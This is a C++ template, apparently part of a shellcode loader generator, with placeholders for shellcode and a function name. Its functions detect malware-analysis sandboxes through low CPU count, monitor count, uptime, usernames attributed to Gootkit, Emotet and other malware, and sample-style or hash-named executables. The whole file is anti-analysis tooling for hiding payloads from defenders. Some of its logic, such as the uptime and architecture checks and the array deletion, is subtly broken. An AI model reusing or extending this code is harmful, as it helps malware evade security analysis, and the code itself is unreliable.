#include <Windows.h>
#include <tchar.h>
#include <Lmcons.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string>

#pragma comment(lib, "Shlwapi.lib")

//####SHELLCODE####

#define MIN_UPTIME_MINUTES 10

bool isLowCPU() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}

bool CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    int *Count = (int*)dwData;
    (*Count)++;
    return true;
}

int MonitorCount() {
    int Count = 0;
    if (EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)MonitorEnumProc, (LPARAM)&Count))
        return Count;
    return -1; // signals an error
}

bool isLowMonitor() {
    return MonitorCount() < 1;
}

bool checkUptime(DWORD minMinutes) {
    ULONGLONG uptime_minutes = GetTickCount64() / (minMinutes * 1000);
    return uptime_minutes < MIN_UPTIME_MINUTES;
}

bool checkHostUsername() {
    CONST TCHAR* szUsernames[] = {
		/* Checked for by Gootkit
		 * https://www.sentinelone.com/blog/gootkit-banking-trojan-deep-dive-anti-analysis-features/ */
		_T("CurrentUser"),
		_T("Sandbox"),
		/* Checked for by ostap
		 * https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/ */
		_T("Emily"),
		_T("HAPUBWS"),
		_T("Hong Lee"),
		_T("IT-ADMIN"),
		_T("Johnson"), /* Lastline Sandbox */
		_T("Miller"), /* Lastline Sandbox */
		_T("milozs"),
		_T("Peter Wilson"),
		_T("timmy"),
		_T("user"),
		/* Checked for by Betabot (not including ones from above)
		 * https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/ */
		_T("sand box"),
		_T("malware"),
		_T("maltest"),
		_T("test user"),
		/* Checked for by Satan (not including ones from above)
		 * https://cofense.com/satan/ */
		_T("virus"),
		/* Checked for by Emotet (not including ones from above)
		 * https://blog.trendmicro.com/trendlabs-security-intelligence/new-emotet-hijacks-windows-api-evades-sandbox-analysis/ */
		_T("John Doe"), /* VirusTotal Cuckoofork Sandbox */
	};

	DWORD nSize = (UNLEN + 1);
	TCHAR* hostUsername = new TCHAR[nSize];
	if (!hostUsername) return false;
	if (0 == GetUserName(hostUsername, &nSize)) {
		delete hostUsername;
		return false;
	}

	WORD dwlength = sizeof(szUsernames) / sizeof(szUsernames[0]);
	for (int i = 0; i < dwlength; i++) {
	    if (_tcscmp(hostUsername, szUsernames[i]) == 0) {
			return true;
		}
	}
	delete hostUsername;
	return false;
}

bool IsWoW64() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    return ((si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_IA64) || (si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_AMD64));
}

bool IsHexString(WCHAR* szStr) {
	std::wstring s(szStr);
	return (std::find_if(s.begin(), s.end(), [](wchar_t c) {return !std::isxdigit(static_cast<unsigned char>(c)); }) == s.end());
}

bool checkFilename() {
    /* Array of strings of filenames seen in sandboxes */
	CONST TCHAR* szFilenames[] = {
		_T("sample.exe"),
		_T("bot.exe"),
		_T("sandbox.exe"),
		_T("malware.exe"),
		_T("test.exe"),
		_T("klavme.exe"),
		_T("myapp.exe"),
		_T("testapp.exe"),

	};

	PPEB pPeb;
	#if _WIN64
	    pPeb = (PPEB)__readgsqword(0x60);
    #elif _WIN32
	    pPeb = (PPEB)__readfsdword(0x30);
    #endif
	if (!pPeb->ProcessParameters->ImagePathName.Buffer) return false;

	// Get the file name from path/
	WCHAR* szFileName = PathFindFileNameW(pPeb->ProcessParameters->ImagePathName.Buffer);
	WORD dwlength = sizeof(szFilenames) / sizeof(szFilenames[0]);
	for (int i = 0; i < dwlength; i++) {
		/* Check if file name matches any blacklisted filenames */
		if (StrCmpIW(szFilenames[i], szFileName) == 0)
			return true;
	}

	// Some malware do check if the file name is a known hash (like md5 or sha1)
	PathRemoveExtensionW(szFileName);
	if ((wcslen(szFileName) == 32 || wcslen(szFileName) == 40 || wcslen(szFileName) == 64) && IsHexString(szFileName))
		return true;
	return false;
}

bool ####FUNCTION####() {
    return checkFilename();
    //return (isLowCPU() || isLowMonitor() || checkUptime(60) || checkHostUsername() || checkFilename());
}